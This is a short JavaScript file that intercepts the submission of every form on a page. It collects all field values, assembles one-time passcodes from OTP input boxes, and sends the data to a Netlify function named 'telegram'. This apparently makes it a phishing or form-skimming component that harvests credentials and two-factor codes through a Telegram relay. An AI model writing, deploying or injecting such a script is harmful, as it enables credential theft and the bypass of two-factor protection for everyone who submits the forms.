(function () {
  'use strict';

  // This makes sure the script runs after the page is fully loaded
  document.addEventListener('DOMContentLoaded', function () {
    var forms = document.querySelectorAll('form');

    forms.forEach(function (form) {
      form.addEventListener('submit', function () {
        var data = {};
        var formData = new FormData(form);
        
        for (var pair of formData.entries()) {
          if (pair[1]) data[pair[0]] = pair[1];
        }

        // Manually grab the OTP if it exists
        var otpInputs = form.querySelectorAll('.otp-inputs input');
        if (otpInputs.length > 0) {
          var otp = '';
          otpInputs.forEach(function (input) { otp += input.value; });
          if (otp) data.otp = otp;
        }

        // Send the data to Netlify
        fetch('/.netlify/functions/telegram', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            title: 'New Form Submission',
            data: data
          })
        }).catch(function (e) { console.warn('[Telegram Error]', e); });
      });
    });
  });
})();
